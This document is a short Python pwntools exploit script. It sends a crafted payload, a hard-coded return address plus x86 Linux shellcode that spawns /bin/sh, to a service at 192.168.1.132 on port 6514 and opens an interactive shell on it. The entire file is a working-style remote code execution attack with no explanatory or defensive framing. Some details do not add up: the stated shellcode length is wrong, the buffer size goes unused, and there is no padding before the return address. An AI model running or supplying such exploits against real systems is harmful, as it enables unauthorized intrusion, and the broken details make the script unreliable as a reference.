#!/usr/bin/env python

from pwn import *

host = '192.168.1.132'
port = 6514

# Define the shellcode (36 bytes)
shellcode = (
    b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
    b"\xe3\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
)

# Define the buffer size
buffer_size = 39

# Craft the payload
eip = b'\x50\x16\x40\x00'
payload = eip + shellcode

# Print the length of the payload
print("Payload length:", len(payload), "bytes")

# Establish connection to remote host
s = remote(host, port)

# Send the payload
s.send(payload)

# Start an interactive session
s.interactive()

